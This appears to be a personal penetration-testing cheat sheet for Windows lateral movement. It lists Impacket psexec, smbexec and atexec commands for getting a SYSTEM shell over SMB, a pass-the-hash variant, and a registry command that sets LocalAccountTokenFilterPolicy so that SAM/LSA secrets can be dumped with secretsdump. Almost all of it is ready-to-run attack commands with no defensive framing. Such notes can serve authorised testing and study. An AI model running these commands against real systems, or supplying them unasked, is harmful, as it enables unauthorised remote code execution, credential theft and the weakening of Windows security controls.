> Need admin privilege on local machine. Will get an `NT Authority/System` shell if works
> Use SMB to get shell. If SMB is not opened on the target machine, this is not usable.

```sh
impacket-psexec "$user:$pass@$target"
```

smbexec is useful when the target machine does NOT have a writeable share available. [How it works](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access)

```sh
impacket-smbexec "$user:$pass@$target"
```

`atexec` use `Task Scheduler` service to execute command

```sh
impacket-atexec "$user:$pass@$target"
```

## Pass the hash

```sh
impacket-psexec "$user@$target" -hashes ":$hash"
```

Same for `impacket-atexec` and `impacket-smbexec`

## LocalAccountTokenFilterPolicy

Use this on machine that does not let you do remote control, this will allow us to get shell via `smb` on the machine.

Usually I use this to dump sam/lsa easier with `impacket-secretsdump`.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 0x1 /f
```
